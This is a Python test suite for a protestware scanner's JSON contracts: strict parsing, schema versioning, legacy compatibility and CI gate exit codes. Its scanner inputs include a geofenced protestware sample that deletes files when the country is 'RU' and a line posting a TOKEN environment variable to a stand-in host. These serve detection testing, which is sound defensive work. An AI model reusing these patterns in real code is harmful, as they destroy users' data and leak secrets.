"""Artifacts remain data: schema versions, legacy readers and fail-closed gates."""
import contextlib
import copy
from hashlib import sha256
import io
import json
from pathlib import Path
import socket
import tempfile
import unittest
from unittest.mock import patch

import ci_integration
import go_build_info
import json_contracts as contracts
import protestware_check as scanner
import scan_policy
from scripts.validate_json import main as validate_cli

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / 'tests/contracts'


def fixture(name):
    return contracts.loads((FIXTURES / name).read_bytes())


def report(code='value = 1', **kwargs):
    result = scanner.build_report('inert contract fixture', [('sample.py', code)], [], [], [],
                                  dependency_mode='off', **kwargs)
    scan_policy.apply(result, scan_policy.load())
    return result


class StrictJSONTests(unittest.TestCase):
    def test_duplicate_members_and_nonfinite_numbers_are_rejected(self):
        for raw in ('{"schema":1,"schema":2}', '{"nested":{"key":1,"key":2}}',
                    '{"value":NaN}', '{"value":Infinity}', '{"value":-Infinity}', '{"value":1e999}'):
            with self.subTest(raw=raw), self.assertRaises(ValueError):
                contracts.loads(raw)

    def test_malformed_utf8_and_depth_budget_have_controlled_errors(self):
        for raw in (b'{"value":"\xff"}', 'not json', '[' * 70 + '0' + ']' * 70,
                    '[' * 1500 + '0' + ']' * 1500):
            with self.subTest(kind=type(raw).__name__), self.assertRaises(ValueError):
                contracts.loads(raw)
        self.assertEqual(contracts.loads('{"unicode":"Пример","number":1.25}'),
                         {'unicode': 'Пример', 'number': 1.25})

    def test_file_budget_symlink_and_unknown_kind_are_rejected(self):
        with tempfile.TemporaryDirectory() as folder:
            target = Path(folder, 'artifact.json')
            target.write_text(' ' * 10001)
            with self.assertRaises(ValueError):
                contracts.load(target, 'gitlab-status')
            link = Path(folder, 'linked.json')
            link.symlink_to(target)
            with self.assertRaises(OSError):
                contracts.load(link, 'report')
            with self.assertRaises(ValueError):
                contracts.load(target, 'https://example.test/schema')

    def test_baseline_and_go_imports_use_strict_reader(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder, 'artifact.json')
            path.write_text('{"schema":1,"schema":2}')
            with self.assertRaisesRegex(ValueError, 'Duplicate'):
                scan_policy.load_baseline(path)
            with self.assertRaisesRegex(ValueError, 'Duplicate'):
                go_build_info.load(path, folder, 'a' * 40)

    def test_concatenated_go_listing_also_rejects_ambiguous_objects(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder, 'listing.json')
            for text in ('{"Path":"a","Path":"b"}\n{"Path":"c"}', '[{"Path":"a","Path":"b"}]'):
                path.write_text(text)
                with self.assertRaisesRegex(ValueError, 'Duplicate'):
                    go_build_info.objects(path, maximum=10)


class ReportCompatibilityTests(unittest.TestCase):
    def gate(self, document, *, raw=None, status=None):
        with tempfile.TemporaryDirectory() as folder:
            target = Path(folder)
            raw = raw or json.dumps(document).encode()
            (target / 'report.json').write_bytes(raw)
            status = status or {'schema': 1, 'report_available': True,
                                'scanner_exit_code': document['gate']['exit_code'],
                                'report_sha256': sha256(raw).hexdigest()}
            (target / 'status.json').write_text(json.dumps(status))
            with contextlib.redirect_stderr(io.StringIO()):
                return ci_integration.gate(target)

    def test_current_report_has_independent_schema_version(self):
        value = report()
        self.assertEqual(value['schema'], 1)
        self.assertEqual(value['version'], scanner.VERSION)
        self.assertIs(contracts.report_version(value), value)
        self.assertEqual(self.gate(value), 0)

    def test_unknown_or_wrong_type_report_version_cannot_pass_gate(self):
        for version in (2, True, 1.0, '1', None):
            value = report()
            value['schema'] = version
            with self.subTest(version=version):
                self.assertEqual(self.gate(value), 2)
        value = report()
        value['version'] = {}
        self.assertEqual(self.gate(value), 2)

    def test_frozen_legacy_report_is_accepted_only_as_known_compatibility(self):
        value = fixture('report-1.3.2.json')
        with self.assertRaisesRegex(ValueError, 'explicit compatibility'):
            contracts.report_version(value)
        normalized = contracts.report_version(value, allow_legacy=True)
        self.assertEqual(normalized['schema'], 1)
        self.assertNotIn('schema', value)
        self.assertEqual(self.gate(value), 1)
        for version in ('1.4.0', '1.3.3', '2.0.0'):
            changed = {**value, 'version': version}
            self.assertEqual(self.gate(changed), 2)

    def test_frozen_status_hash_binds_original_legacy_bytes(self):
        value = fixture('report-1.3.2.json')
        raw = (FIXTURES / 'report-1.3.2.json').read_bytes()
        self.assertEqual(self.gate(value, raw=raw, status=fixture('gitlab-status-v1.json')), 1)

    def test_inconsistent_counts_risk_or_incomplete_gate_are_rejected(self):
        changes = (lambda r: r['summary'].update(high=1),
                   lambda r: r['policy'].update(risk='high'),
                   lambda r: r['gate'].update(exit_code=1),
                   lambda r: r['scan'].update(complete=False),
                   lambda r: r['coverage'].update(files_analyzed=99))
        for change in changes:
            value = report()
            change(value)
            with self.subTest(change=change.__code__.co_firstlineno):
                self.assertEqual(self.gate(value), 2)

    def test_gate_rejects_duplicate_report_and_status_members(self):
        value = report()
        raw = json.dumps(value).encode()
        self.assertEqual(self.gate(value, raw=raw[:-1] + b',"schema":1}'), 2)
        with tempfile.TemporaryDirectory() as folder:
            Path(folder, 'status.json').write_text('{"schema":1,"schema":1,"report_available":false,"scanner_exit_code":2}')
            with contextlib.redirect_stderr(io.StringIO()):
                self.assertEqual(ci_integration.gate(folder), 2)

    def test_core_scanner_and_gate_do_not_require_optional_validator(self):
        with patch.dict('sys.modules', {'jsonschema': None, 'referencing': None}):
            self.assertEqual(self.gate(report()), 0)

    def test_validator_dependency_absence_has_actionable_exit_two(self):
        contracts._validator.cache_clear()
        with patch.dict('sys.modules', {'jsonschema': None, 'referencing': None}), \
                contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(validate_cli(['go-build-info', str(FIXTURES / 'go-build-info-v1.json')]), 2)
        self.assertIn('requirements-contracts.txt', err.getvalue())


class JSONSchemaTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        try:
            import jsonschema  # noqa: F401
        except ImportError:
            raise unittest.SkipTest('requirements-contracts.txt required for full contract checks')

    def test_all_schemas_are_valid_and_have_only_internal_references(self):
        paths = sorted((ROOT / 'schemas').glob('*.schema.json'))
        self.assertEqual(len(paths), 5)
        for path in paths:
            value = contracts.loads(path.read_bytes())
            self.assertEqual(value['$schema'], 'https://json-schema.org/draft/2020-12/schema')
            self.assertTrue(value['$id'].startswith('urn:protestware-check:schema:'))
            contracts._validator(path.name)
            todo = [value]
            while todo:
                item = todo.pop()
                if isinstance(item, dict):
                    if '$ref' in item:
                        self.assertTrue(item['$ref'].startswith('#/'), item['$ref'])
                    todo.extend(item.values())
                elif isinstance(item, list):
                    todo.extend(item)

    def test_cli_reports_for_clean_findings_and_incomplete_inventory(self):
        scenarios = [('value = 1', [], 0),
                     ('import shutil\nif country == "RU":\n    shutil.rmtree("fixture")', [], 1),
                     ('value = 1', ['--dependencies', 'lock', '--dependency-strict'], 2)]
        for source, extra, expected in scenarios:
            with tempfile.TemporaryDirectory() as folder:
                target = Path(folder, 'source')
                target.mkdir()
                (target / 'sample.py').write_text(source)
                output = Path(folder, 'report.json')
                result = scanner.main(['--path', str(target), '--dependencies', 'off', *extra,
                                       '--format', 'json', '--output', str(output)])
                self.assertEqual(result, expected)
                contracts.validate(contracts.load(output, 'report'), 'report')

    def test_dependency_and_watchlist_variants_conform(self):
        manifests = [('package-lock.json', json.dumps({'name': 'fixture', 'lockfileVersion': 3,
                      'packages': {'': {'dependencies': {'fixture-dependency': '1.0.0'}},
                                   'node_modules/fixture-dependency': {'version': '1.0.0',
                                   'resolved': 'https://registry.npmjs.org/fixture-dependency/-/fixture-dependency-1.0.0.tgz'}}}))]
        watchlists = {'black': set(), 'toxic': {}, 'packages': {}, 'metadata': {'mode': 'offline'}}
        for mode in ('off', 'lock', 'registry'):
            with patch.object(scanner.dependency_analysis, 'official_json',
                              side_effect=scanner.dependency_analysis.RegistryError('offline contract fixture')):
                value = scanner.build_report('fixture', manifests, [], [], [], dependency_mode=mode,
                                             watchlists=watchlists, dependency_max_requests=1)
            scan_policy.apply(value, scan_policy.load())
            contracts.validate(value, 'report')

    def test_findings_with_trace_and_node_identity_conform(self):
        value = report('import os, requests\nrequests.post("https://example.test", data=os.getenv("TOKEN"))')
        self.assertTrue(any(item.get('dataflow') for item in value['findings']))
        contracts.validate(value, 'report')
        item = value['findings'][0]
        item.update(resolved_symbol='node:fs/promises.rm', binding_certainty='possible')
        contracts.validate(value, 'report')

    def test_advisory_package_identity_and_metadata_conform_offline(self):
        with patch.object(scanner.malware_intel, 'fetch_json', side_effect=[
                {'results': [{'vulns': [{'id': 'MAL-2026-123'}]}]}, {'id': 'MAL-2026-123'}]):
            value = scanner.build_report('fixture', [], [], [], [], dependency_mode='lock',
                                         explicit_packages=['npm:contract-fixture@1.0.0'], malware_mode='osv')
        scan_policy.apply(value, scan_policy.load())
        self.assertTrue(any(item['rule'] == 'MALWARE_ADVISORY' for item in value['findings']))
        contracts.validate(value, 'report')

    def test_go_profile_provenance_in_report_conforms(self):
        build = fixture('go-build-info-v1.json')
        build.update(inputs_verified=True, snapshot_sha256='a' * 64,
                     logical_digest=go_build_info.logical_digest(build))
        value = scanner.build_report('fixture', [('go.mod', 'module example.test/app\ngo 1.22\n')],
                                     [], [], [], ast_mode='off', go_builds=[build])
        scan_policy.apply(value, scan_policy.load())
        self.assertTrue(value['dependencies']['go_builds'])
        contracts.validate(value, 'report')

    def test_frozen_legacy_fixture_and_additive_metadata_are_compatible(self):
        legacy = fixture('report-1.3.2.json')
        with self.assertRaises(ValueError):
            contracts.validate(legacy, 'report')
        contracts.validate(legacy, 'report', allow_legacy_report=True)
        current = report()
        current['future_metadata'] = {'note': 'additive fields are ignored by older readers'}
        contracts.validate(current, 'report')

    def test_baseline_writer_legacy_reader_and_review_context(self):
        current = scan_policy.baseline(report())
        contracts.validate(current, 'baseline')
        contracts.validate(fixture('baseline-v2.json'), 'baseline')
        legacy = {key: val for key, val in current.items() if key != 'context'}
        legacy['schema'] = 1
        contracts.validate(legacy, 'baseline')
        with self.assertRaisesRegex(ValueError, 'schema 2'):
            scan_policy.apply(report(), scan_policy.load(), baseline_values=scan_policy.parse_baseline(legacy), only_new=True)
        for field, val in (('schema', 2), ('source_files', True), ('source_digest', 'bad'), ('extra', 'unsupported')):
            changed = copy.deepcopy(current)
            changed['context'][field] = val
            with self.subTest(field=field), self.assertRaises(ValueError):
                contracts.validate(changed, 'baseline')

    def test_go_snapshot_shape_and_graph_semantics_are_both_checked(self):
        valid = fixture('go-build-info-v1.json')
        contracts.validate(valid, 'go-build-info')
        variants = []
        missing = copy.deepcopy(valid)
        missing['packages'][0]['imports'] = ['missing/package']
        variants.append(missing)
        cycle = copy.deepcopy(valid)
        cycle['packages'][0]['imports'] = [cycle['packages'][0]['path']]
        variants.append(cycle)
        flag = copy.deepcopy(valid)
        flag['profile']['cgo_enabled'] = 'false'
        variants.append(flag)
        escaped = copy.deepcopy(valid)
        escaped['module_roots'] = ['..']
        variants.append(escaped)
        for value in variants:
            with self.assertRaises(ValueError):
                contracts.validate(value, 'go-build-info')

    def test_status_true_false_and_digest_contract(self):
        contracts.validate(fixture('gitlab-status-v1.json'), 'gitlab-status')
        contracts.validate({'schema': 1, 'scanner_exit_code': 2, 'report_available': False,
                            'report_sha256': None}, 'gitlab-status')
        for value in ({'schema': 1, 'scanner_exit_code': 0, 'report_available': False, 'report_sha256': None},
                      {'schema': 1, 'scanner_exit_code': 0, 'report_available': True, 'report_sha256': None}):
            with self.assertRaises(ValueError):
                contracts.validate(value, 'gitlab-status')

    def test_unknown_versions_and_ambiguous_numeric_version_types_are_rejected(self):
        for kind, original in [('report', report()), ('baseline', fixture('baseline-v2.json')),
                               ('go-build-info', fixture('go-build-info-v1.json')),
                               ('gitlab-status', fixture('gitlab-status-v1.json'))]:
            for bad in (99, True, 1.0, '1'):
                value = {**original, 'schema': bad}
                with self.subTest(kind=kind, schema=bad), self.assertRaises(ValueError):
                    contracts.validate(value, kind)

    def test_timestamp_requires_real_calendar_date_and_timezone(self):
        original = fixture('baseline-v2.json')
        for bad in ('2026-02-30T10:00:00Z', '2026-11-12T10:00:00', 'yesterday'):
            with self.subTest(timestamp=bad), self.assertRaises(ValueError):
                contracts.validate({**original, 'created_at_utc': bad}, 'baseline')

    def test_validation_never_follows_data_references_or_executes_payload(self):
        value = report()
        value.update({'$schema': 'https://example.test/private-schema', '$ref': 'file:///private/data'})
        with patch.object(socket, 'create_connection', side_effect=AssertionError('No network')), \
                patch('subprocess.run', side_effect=AssertionError('No target execution')):
            contracts.validate(value, 'report')
            contracts.validate(fixture('go-build-info-v1.json'), 'go-build-info')

    def test_validation_cli_exit_code_and_errors_do_not_disclose_values(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder, 'report.json')
            value = report()
            value['findings'] = [{'evidence': 'private fixture text must remain private'}]
            path.write_text(json.dumps(value))
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(validate_cli(['report', str(path)]), 2)
            self.assertNotIn('private fixture text', err.getvalue())
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(validate_cli(['report', str(FIXTURES / 'report-1.3.2.json'), '--allow-legacy-report']), 0)


if __name__ == '__main__':
    unittest.main()
